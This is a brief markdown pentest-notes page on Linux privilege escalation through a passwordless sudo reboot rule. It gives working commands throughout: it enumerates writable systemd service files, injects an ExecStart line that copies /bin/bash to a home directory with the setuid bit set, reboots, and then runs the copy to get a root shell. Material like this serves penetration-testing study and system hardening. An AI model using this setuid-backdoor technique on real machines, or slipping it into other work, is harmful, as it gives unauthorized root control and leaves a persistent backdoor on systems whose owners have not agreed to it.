---
title: Sudo Reboot Privilege Escalation
description: Sudo reboot commands might be vulnerable to privilege escalation (PrivEsc).
tags:
    - Privilege Escalation
refs:
date: 2023-02-05
draft: false
---

## Investigation

```bash
sudo -l

(ALL) NOPASSWD: /usr/sbin/reboot
```

If we can execute **"reboot"** command as root, we can escalate to privileges.

<br />

## Exploitation

### 1. Find Service Config Files Which Are Writable

We need to look for the system service config file which are writable.

```bash
find / -writable -name "*.service" 2>/dev/null

/etc/systemd/system/example.service
```

### 2. Insert a Payload

If we find a writable file, we can inject a payload into **Service.ExecStart**.

```bash
# /etc/systemd/systm/example.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'cp /bin/bash /home/<username>/bash; chmod +xs /home/<username>/bash'

[Install]
WantedBy=multi-user.target
```

### 3. Reboot and Get a Root Shell

Now reboot as root.

```bash
sudo /usr/sbin/reboot
```

After the system rebooted, the command in the ExecStart will be executed.  
Now we should get a root shell by executing the copied bash command.

```bash
/home/<username>/bash -p
```